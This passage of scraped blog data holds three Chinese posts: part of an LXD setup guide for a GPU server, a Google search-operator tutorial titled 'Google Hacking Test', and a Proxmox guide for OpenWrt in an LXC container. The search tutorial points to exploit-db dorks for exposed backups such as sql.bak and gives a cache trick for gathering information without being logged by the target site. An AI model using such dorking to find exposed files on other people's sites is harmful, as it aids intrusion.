device：输入现有的硬盘，比如我的为sda1，那么就输入/dev/sda1 MAAS server：MAAS是一个用于将物理机视为云服务器的集群服务，默认为no，回车即可 new local network bridge：是否创建一个新的桥接网络，输入yes new bridge be called：命名新的网桥名称，默认即可 IPv4：IPv4相关配置，默认为auto，回车即可 IPv6：IPv6相关配置，默认为auto，回车即可 would you like lxd to be available over the network：使用想通过网络访问LXD，默认为no，回车即可 would you like stale cached images to be updated automatically：默认yes，回车即可 YAML printed：是否打印出lxd init的配置信息，默认为no，回车即可 创建容器模板 创建容器模板的意义在于你可以设置一个基础配置的容器，然后基于这个容器进行复制出多个容器出来，而不用再针对每个容器进行重复的基础设置。 在使用前需要下载一个已打包的容器镜像，因为需要下载，所以可以使用清华大学的国内镜像用于提升下载镜像的速度。 添加清华大学镜像源：","title":"GPU服务器的多人环境搭建"},{"content":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。\n时间类 Google提供after和before用于搜索网页发布的时间，两个高级操作符的value格式为YYYY-MM-DD，两个操作符的value，只能单独设置年格式年或者完整日期格式年-月-日，而不能只提供年-月的格式。比如/北京市 before:2020-08/的2020-08就会作为关键词，而应该使用/北京市 before:2020-08-01/或者/北京市 before:2020/。 如果要限定时间范围，则可以同时使用after和before，但是需要注意同时使用，其中一个需要按照完整格式给出。如/北京市 after:2020 before:2021/就无法筛选时间，其他的时间结果也会存在结果当中，而应该使用/北京市 after:2020 before:2021-12-30/或者/北京市 after:2020-01-01 before:2021/。\n缓存类 Google搜索提供用于查看缓存的搜索语法cache，而这个语法不能与其他语法共用，并且语法规则也较为严格，需要输入完整的url，但是大部分的时候是不需要使用这个语法的，而是自己通过搜索结果后，进行查询，而对于没有缓存的页面则会直接返回错误的页面。 缓存中会提供三种版本，完整版、纯文字版、源代码，完整版是Google提供了文字信息，而对于动态加载的数据、图片等则是通过调用原始网页的信息，也就是说你除了和Google服务器进行请求，还可能会和原网站进行请求资源，纯文字版和源代码则只会与Google进行请求，在信息搜集等时候，可以利用该方法避免暴露自己的信息，同时已删除掉的部分网页也可以通过缓存获取到相关的信息。 避免暴露信息的方式使用可以先获取到搜索结构的连接，然后通过替换url字符串直接访问纯文字版本http://webcache.googleusercontent.com/search?q=cache:5YLkdysWgnIJ:替换为完整url\u0026amp;strip=1 来访问目标网址的缓存，比如访问 上面的链接中里面的strip=1代表直接访问纯文本，所以这样你就不需要打开缓存页面然后再选择纯文本版，这样就只会和google服务器请求数据，而不会被目标网站记录。\n文件类型操作符 Google搜索提供了一种以特定文件扩展名结尾的网页搜索语法filetype，这个语法可以方便我们去搜索像pdf/doc/xlsx等指定的文件后缀，这个功能在Google高级设置中能设置，但是高级搜索中仅仅只提供了部分的可选后缀，而通过语法你可以查询其他的特殊文件扩展名的网页，比如搜索包含故宫关键词的pdf文件/故宫 filetype:pdf/、搜索包含故宫的表格文件/故宫 filetype:xlsx/等。 但对于常用的文件类型Google会进行解析，但对于不太常用的文件类型Google则不会解析，常见 类型比如pdf类型即使不是网页pdf后缀，也能够识别出来，这是因为Google在抓去网页的时候会解析内容。比如/故宫 filetype:pdf -pdf/。 除此之外，https://filext.com/list/s 网站搜集了非常多的文件扩展名及用途。\n关键词监控工具 Google搜索提供了一个用于推送关键词监听的工具”google alert”，这个工具可以去更改推送频率、来源、语言等设置，而且搜索框中也支持Google的基础搜索、布尔、高级操作符，当新的结果显示在Google搜索结果中的时候，将会将新信息推送至你设置的邮箱当中。 这个工具对于关键词热度、舆情监控是非常有用的。\n参考资料 《Google Hacking 技术手册》 https://www.indeed.com/career-advice/finding-a-job/google-search-operators https://kinsta.com/blog/google-search-operators/ https://support.google.com/websearch/answer/2466433?hl=en\u0026amp;visit_id=638009788259931665-4261219002\u0026amp;rd=1 https://securitytrails.com/blog/google-hacking-techniques https://www.google.com/search/howsearchworks/how-search-works/ranking-results/ https://www.google.com/alerts# https://developers.google.com/search/docs/advanced/guidelines/webmaster-guidelines?hl=zh-cn ","permalink":"https://wuyizhou.com/posts/google-hacking-test/","summary":"前言 学习Google搜索，其目的是用于让自己得到更精准的信息，所以善用Google搜索对于信息收集、安全测试、查找答案等都有着非常大的帮助。而随着时间的变化Google对于语法的更新、规则都在改动，这些改动对于结果都有影响，所以使用前进行测试是非常有必要的。 查阅了诸多资料过后，将Google搜索的操作分为了三个等级，分别为基础搜索、布尔操作符、高级操作符，每个级别的都可以进行配合使用，有些组合起来能够让搜索更加精准，而有些则是不能进行组合。 同时这些搜索方式会与高级搜索设置中的功能重叠，但个人偏向使用语法对比高级搜索设置方便许多，所以后面的内容均使用语法，不会涉及到搜索设置等。 除此之外，还有诸多的网站可以获取到Google语法的途径，比如exploit-db是一个用于记录安全测试的Google语法数据库，这里面记录了非常多因配置失误操作的漏洞，如获取sql备份文件sql.bak等。Google Help提供常用的Google语法等。\n影响搜索的因素 Google在搜索原理的一篇简单的介绍了会影响搜索结果的几个因素，分别为以下7个因素：\n如果为中文，需要进行分词、语法等NLP技术的信息提取。\n查询理解，这个步骤典型的就是修正错别字，比如你搜索“贝京市”，那么算法会将关键词进行修正为“北京市”，所以返回的内容中也是“北京市”相关的内容。这个步骤我没有找到具体的文献，但和步骤1是有较强的联系。\n内容相关性，这个步骤典型的作用就是搜索网页中任何地方是否出现与关键词命中。\n内容质量，这个步骤用于确定网页是否具备权威、专业等，除了常见的网站认证、知名度、访问量等，还有Google的基于网页链接的算法，如PageRank，这种算法类似于投票，越权威的网站被引用/超链接的次数越多。基于这些情况然后进行排序，将这些高质量的网站靠前输出。\n网页可用性，这个步骤用于确定网页是否网页是否“优秀”，而Google是有一套公开的标准，典型的就是网页加载速度、适配各个访问的客户端、是否HTTPS、广告等。\n上下文设置，这个步骤和自己的历史数据、设置有关系，比如你的历史搜索中多次搜索了“巴塞罗那对阿森纳”，当你搜索“巴塞罗那”的时候，可能更加想访问的是“巴塞罗那球队”而不是“巴塞罗那地区”，该部分的影响，可以通过Google搜索主页右下角设置中的“您在Google搜索中的数据设置”删除，或者直接使用无痕模式搜索可以消除该影响。 除了这个，地区也会导致你的搜索结果会有影响，在Google右下角设置中的“搜索设置”里面的“区域设置”可以验证，比如将该设置更改为美国，你搜索\u0026quot;football\u0026quot;则是返回的NFL橄榄球职业比赛联盟，而如果将地区设置为英国，返回的则是足球。\n符号，在Google搜索中符号如（、。，/等都不会影响搜索结果，比如你搜索的是/中国北京/，那么结果中\u0026quot;中国（北京\u0026hellip;\u0026ldquo;这样的结果也会匹配。\n基础搜索 基础搜索是最常见的，里面包含了两种搜索方式：\n关键词查询：关键词查询就是最常用的方式，直接输入关键词查询或者给出多个以空格间隔的关键词，如/中国北京/或者/中国 北京/。但需要注意的是使用关键词查询，会尽可能的分词和理解你的意图（影响搜索的因素中的步骤一），并尽可能的返回有关的内容，那么如/中国北京/，就有可能包含/中国北京/、/中国/、/北京/等结果返回。\n准确查询：精确查询用双引号包裹一个或者多个关键词，与关键词查询不同之处在于精确查询并不会对关键词进行分词，而是原封不动的进行完整的匹配，所以你搜索/中国北京/，就有可能包含\u0026quot;中国北京\u0026rdquo;、\u0026ldquo;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。而搜索/\u0026ldquo;中国北京\u0026rdquo;/，则代表每一个结果都按照\u0026quot;中国北京\u0026quot;这个词进行完整的匹配，不会出现\u0026quot;中国\u0026rdquo;、\u0026ldquo;北京\u0026quot;等结果返回。 而如果精确搜索给出了多个关键词，如/\u0026ldquo;中国 北京\u0026rdquo;/，则这个中间的空格代表着顺序，说所以可以理解为查询的含义为在\u0026quot;中国\u0026quot;这个词后紧跟着\u0026quot;北京\u0026quot;这个关键词。\n除了这两种搜索之外，还包含了几个符号：\n通配符：通配符*与程序中的通配符意义不一样，中文和英文搜索中这里的通配符代表的是一个词，比如/\u0026ldquo;北京市 故宫\u0026rdquo;/，将“京”替换为*，也就是/\u0026ldquo;北*市 故宫\u0026rdquo;/搜索，那么返回的结果中可能包含着如“北厦门市故宫”、\u0026ldquo;北秋田市故宮\u0026quot;等结果。如果将搜索改为/\u0026rdquo;*市 故宫\u0026rdquo;/，那么你看见命中的关键词（红色标注）则为“太保市故宮”、“北京市故宫”等词。所以这说明通配符匹配的是一个词，而不是一个字，作用是尽可能的将一个词与前后的关键字进行组合成一个完整的词。\n单字任意符：这个符号对于中文不太友好，中文下呈现的大多数能匹配到标点符号，而代表任意中文字符则不行，如搜索\u0026quot;湖北省\u0026quot;、\u0026ldquo;湖南省\u0026quot;等相关信息，所以语法为/\u0026ldquo;湖*省\u0026rdquo;/，但是返回的则是\u0026quot;湖省\u0026quot;和\u0026quot;湖（省\u0026rdquo;。 而对于英文则是能替代任意字符，比如/\u0026ldquo;hac*ing\u0026rdquo;/，则能搜索到\u0026quot;hacking\u0026quot;等结果。\n括号：Google搜索中对于括号是不敏感的，所以如 /北京(（市/ 搜索中放置了一个中文一个英文的括号，都会正常返回“北京市”结果，而在精确操作中同样适用，即/\u0026ldquo;北京(（市\u0026rdquo;/也能正确返回“北京市”的结果。 而基于括号这个操作，在搜索过程中就可以利用这个特性进行符合人类识别的分块构建查询，这个在于后面的布尔操作符和高级操作符上使用较多。\n布尔操作符 布尔操作符可以使用于基础搜索以及高级操作符，非常灵活，对于信息筛选的帮助非常大，主要为以下三种：\nAND操作符：该操作符用+表示添加在关键词前。和代码中的不一样，代码中表示的是两者都必须具备，而在Google中，代表的是多添加一个关键词进行搜索，所以这个操作符没有太大的意义，如搜索/北京 +故宫/和/北京 故宫/结果相差不大，这是因为Google本身就会将所有关键词放进搜索条件中进行搜索。\nNOT排除操作符：该操作符用-表示添加在关键词前，与字面意义一样，用于排除某个条件，如关键词返回的结果等，比如想了解/故宫/的信息，但不想看旅游相关的信息，如同程，那么就可以使用该操作符搜索/故宫 -同程/。\nOR操作符：该操作符用|表示添加在两个关键词之间，代表的意义为两个关键词匹配任意一个匹配网页的内容都可以返回，比如/北京|重庆 /，那么将返回北京或者重庆相关的页面。 OR操作符可以用于关键词的多选组合，比如查看北京的地铁规划，那么\u0026quot;地铁\u0026quot;一词可能也叫\u0026quot;轨道\u0026quot;，\u0026ldquo;规划\u0026quot;一词也可能叫\u0026quot;计划\u0026rdquo;，那么这个时候就可以通过OR操作符搜索/\u0026ldquo;北京 地铁|轨道 规划|计划\u0026rdquo;/（也可以利用括号进行分组，即/\u0026ldquo;北京 (地铁|轨道) (规划|计划)\u0026quot;/），那么Google将尝试组合“北京地铁计划”、“北京轨道计划”、“北京地铁规划”、“北京轨道规划”等关键词搜索。\n高级操作符 Google提供的搜索结果中，每条记录包含了六个部分，分别为标题、正文（简介）、URL、时间、缓存、文件类型，所有高级操作符也是围绕着这几个部分进行更为精细的控制，比如针对标题的搜索、正文的搜索、url的搜索等。 操作符有着严格的格式，高级操作符的语法为Operator:value，并且操作符、冒号、值之间不能有空格。如果不按照该格式，Google搜索将会把高级操作符当作关键词进行搜索，而查看自己是否有语法的错误，可以通过返回的结果中命中的红色关键词是否有异常，比如是否包含了高级操作符。 除此之外，前面精准搜索、布尔操作符都可以与高级操作符结合。\n标题类 标题类操作符为intitle和allintitle，用于搜索网页的标题，意味着你关键词的搜索范围仅限于标题。\nintitle：用于搜索单个词是否包含在标题中，比如搜索/intitle:\u0026ldquo;北京市\u0026rdquo;/，如果你要查询多个关键词用于搜索标题符合的网页，那么可以使用多个intitle或者使用allintitle。 allintitle：该高级操作符是会将后面所有的单词用于搜索标题，所以如intitle搜索标题中包含\u0026quot;北京市\u0026quot;和\u0026quot;故宫\u0026quot;的关键词，那么需要写两个intitle，而allintitle则只需要写一个/allintitle:\u0026ldquo;北京市\u0026rdquo; \u0026ldquo;故宫\u0026rdquo;/，但需要注意all开头的大部分高级操作符与其他操作符进行组合使用的时候会出现问题，所以如果你只是单独的搜索标题那么可以使用allintitle，而如果要与其他条件进行组合，那么建议使用intitle。 正文类 正文类操作符为intext和allintext，用于搜索网页的正文，意味着你的关键词的搜索范围仅限于正文/简介。\nintext：用于搜索单个词是否包含在正文中，比如搜索/intext:北京市/，如果你查询多个同样使用多个intext。 allintext：用于搜索正文中的多个词，同样与allintitle用法一样。 URL类 URL类用于搜索网址，涉及的高级操作符有4个，分为：\ninurl和allinurl：inurl和allinurl的使用方法和标题类、正文类一致。\nsite：site高级操作符用于搜索某个特定的域名或者域，比如只搜索微博关于故宫的信息，那么搜索语法为/site:weibo.com 故宫/。而搜索特定的域，则指的是com、cn、edu.cn等域名的后缀，如搜索所有的国内学校研究生招生的情况，则搜索语法为/site:edu.cn 研究生招生/。\ninanchor：inanchor高级操作符用于搜索超链接的文本。比如链接地址为weibo.com/xxx，而这个链接的文本则显示为“我的微博”，在html表示为\u0026lt;a href=\u0026quot;https://weibo.com/xxx\u0026quot;\u0026gt;我的微博\u0026lt;/a\u0026gt;，inanchor就是用于搜索这个链接文本“我的微博”。 该操作符搜索返回的结果并非是网页中是否包含，而是直接返回该链接，比如“我的微博”这个链接存放在我的主页，Google并不会返回我的主页作为结果，而是将\u0026quot;我的微博\u0026quot;这条链接直接作为结果。","title":"Google Hacking Test"},{"content":"前期工作 环境和机器配置：\n机器：5105v4 i226-v版本\npve： 7.1.2，内核Linux 5.13.19-2-pve\n准备工作：\n将网线连接到pve管理口，如果已安装openwrt，然后关闭原openwrt虚拟机，删除直通的网卡。\n准备一份没有引导的openwrt固件包，可以是img也可以是tar.gz，但一定是没有引导的包，可以看文件名中包含rootfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img或openwrt-21.02.0-x86-64-rootfs.tar.gz（前者是我自己编译的，重点在于rootfs）。\nPVE直通配置 连接到PVE，输入命令：\nnano /etc/default/grub 找到下面这一行：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet\u0026#34; 然后添加\u0026quot;intel_iommu=on\u0026quot;，这是英特尔的直通配置，AMD需要自行查找配置命令：\nGRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet intel_iommu=on\u0026#34; 然后更新引导：\nupdate-grub 修改nano /etc/modules内核模块文件，添加直通的驱动，让系统启动的时候载入这些驱动：\nvfio vfio_iommu_type1 vfio_pci vfio_virqfd 执行命令来更新内核：\nupdate-initramfs -u -k all. 创建基础环境文件包 tar.gz格式 如果包后缀为tar.gz，则通过scp直接上传至pve，以下[]内的字符根据自己情况进行替换（包括[和]符号），然后跳至下一章节：\nscp [固件路径.tar.gz] root@[pveIP地址]:/var/lib/vz/template/cache img格式 上传固件：\nscp [固件路径.img] root@[pveIP地址]:/root 这里需要注意，如果你的固件包是带squashfs字符，比如openwrt-x86-64-generic-squashfs-rootfs.img，你需要按照下面的方式进行解压。 安装解压包：\napt install squashfs-tools 解压镜像文件：\nunsquashfs [固件路径.img] 解压完成后你在同级目录下会得到squashfs-root文件夹，然后进入该文件夹，跳至3步骤。 如果你是不带squashfs字符，比如openwrt-x86-64-generic-ext4-rootfs.img，则需要通过挂载镜像，得到内部文件，首先创建一个挂载点（下面操作在root目录中进行）：\nmkdir op 然后挂载镜像：\nmount -t ext4 -o loop [固件路径.img] /root/op 然后进入/root/op，跳至3步骤（完成后，通过使用umount /root/op进行卸载镜像）。\n打包为pve的CT模板包： 进入上述2步骤中得到的文件夹中，然后使用下列命令进行打包，得到的文件下文称为op-ct模版：\ntar zcf /var/lib/vz/template/cache/[固件名称].tar.gz ./* 创建容器 准备工作做完后，就开始创建lxc容器，通过下列命令进行创建：\npct create 110 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz --rootfs local-lvm:2 --ostype unmanaged --hostname openwrt-ct --arch amd64 --cores 2 --memory 1024 --swap 0 -net0 bridge=vmbr0,name=eth0 这里详细说明一下每个参数的意思，使用的时候需要根据自己的情况进行更改：\npct create：容器创建命令 110：容器ID，可根据自己情况设定 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz： 为第三步骤所得到的固件包名称 --rootfs：模版为rootfs文件 local-lvm:2 ：后面的数字代表分配的磁盘大小，比如我这里设置的为2，即为即将创建的容器分配2G的大小 --ostype unmanaged：操作系统类型，这里没有填写指定的操作系统（不会影响） --hostname openwrt-ct：主机名，也就是虚拟机名称 --arch amd64：设置为64位 --cores 2：分配给容器的核心数（我不知道这里是不是和docker一样，为最大限制） --memory 1024：分配给容器最大的内存数量 --swap 0：交换分区设置为0 -net0 bridge=vmbr0,name=eth0：网卡，这里一定要设置，不然你的op没有办法连接到pve的虚拟交换机。 按照上述命令执行完成后，应该会得到如下的内容：\nroot@pve:/var/lib/vz/template/cache# pct create 110 local:vztmpl/openwrt-x86-64-generic-ext4-rootfs.tar.gz --rootfs local-lvm:2 --ostype unmanaged --hostname openwrt-ct --arch amd64 --cores 2 --memory 1024 --swap 0 -net0 bridge=vmbr0,name=eth0 Logical volume \u0026#34;vm-110-disk-0\u0026#34; created. Creating filesystem with 524288 4k blocks and 131072 inodes Filesystem UUID: 15d6753a-ceb2-45d3-9dca-903f97f0f197 Superblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912 extracting archive \u0026#39;/var/lib/vz/template/cache/openwrt-x86-64-generic-ext4-rootfs.tar.gz\u0026#39; Total bytes read: 143063040 (137MiB, 86MiB/s) 网卡直通 编辑lxc容器的配置文件，进行网卡直通： vim /etc/pve/lxc/[容器ID].conf 在最下面添加以下内容：\n# openwrt.common.conf是PVE自带的openwrt配置文件示例，内含一些基本设置 lxc.include: /usr/share/lxc/config/openwrt.common.conf # /dev/ppp pppoe拨号等功能需要用到 lxc.cgroup.devices.allow: c 108:0 rwm # 钩子脚本，用于添加 /dev/ppp等设备 hookscript: local:snippets/hookscript.pl # 这里是网卡直通重要的部分。 lxc.net.1.type: phys lxc.net.1.link: enp3s0 lxc.net.1.flags: up lxc.net.2.type: phys lxc.net.2.link: enp4s0 lxc.net.2.flags: up lxc.net.3.type: phys lxc.net.3.link: enp5s0 lxc.net.3.flags: up 需要注意，网卡直通部分里面的网卡名字，需要根据pve控制面板选择【pve】-【系统】-【网络】中查看，其中一定避免管理口，我这里是enp2s0为管理口，所以没有直通，而是在启动容器的时候，作为桥接接进来了。我的软路由为5105四口，所以这里排除了管理口，我直通了2-4网口。 除此之外，lxc.cgroup.devices.allow: c 108:0 rwm为ppp字符设备的主次设备编号，其中108为ppp设备主编号，0为设备次编号，获取这个编号可以通过ls -al /dev/ppp获取，大致返回如下的内容。\nroot@pve:~# ls -al /dev/ppp crw------- 1 root root 108, 0 Sep 9 21:07 /dev/ppp 创建pve容器启动时的钩子脚本，用于配置ppp设备的添加等。 mkdir /var/lib/vz/snippets cp /usr/share/pve-docs/examples/guest-example-hookscript.pl /var/lib/vz/snippets/hookscript.pl vim /var/lib/vz/snippets/hookscript.pl 然后修改内容：\n在第36行可以找到以下内容 # Second phase \u0026#39;post-start\u0026#39; will be executed after the guest # successfully started. print \u0026#34;$vmid started successfully.\\n\u0026#34;; 修改为 # Second phase \u0026#39;post-start\u0026#39; will be executed after the guest # successfully started. system(\u0026#34;lxc-device add -n $vmid /dev/ppp\u0026#34;); system(\u0026#34;lxc-device add -n $vmid /dev/net/tun\u0026#34;); print \u0026#34;$vmid started successfully.\\n\u0026#34;; 设置防火墙 在pve管理界面，选择创建的容器，然后切换至防火墙页面，点击添加，然后添加两次，每次只需要改动方向in和out和勾选启用。按照下面的教程中，设置端口好像报错，但不设置设备接入后又无法联网，但这样添加后，即可联网。\n重启 重启整个pve，如果不重启直接启动容器，这个网卡会提示找不到，具体原因暂不知道。重启后，即可启动容器，按照正常的openwrt配置即可。\n其他 这里配置openwrt的时候需要注意，因为网卡是直通的，所以网卡名可能和虚拟机不一样，虚拟机中是eth0-3，而在容器里面，除了指定的eth0（管理口，也是网口1），剩余的网口名称为enp3s0、enp4s0、enp5s0，也就是对应的2、3、4口（我的环境下），所以根据自身情况选择对应的网口分配wan和lan口进行。 在设置完wan口和防火墙后，openwrt拨号设置后，你需要重启pve，才能生效。我猜测这是因为拨号配置是挂载的pve的，所以pve将配置文件载入到内存中，即使重启容器也还是从pve内存中读，应该有其他方法在pve中重载入配置文件，但目前我没有找到。 参考 https://www.right.com.cn/forum/thread-8218119-1-1.html https://blog.csdn.net/kangzeru/article/details/115373587 https://4xu.net/posts/koolshare-2.html/ https://pvecli.xuan2host.com/lxc-network-bypass/ https://39.108.190.212/archives/42.html ","permalink":"https://wuyizhou.com/posts/lxc-openwrt/","summary":"前期工作 环境和机器配置：\n机器：5105v4 i226-v版本\npve： 7.1.2，内核Linux 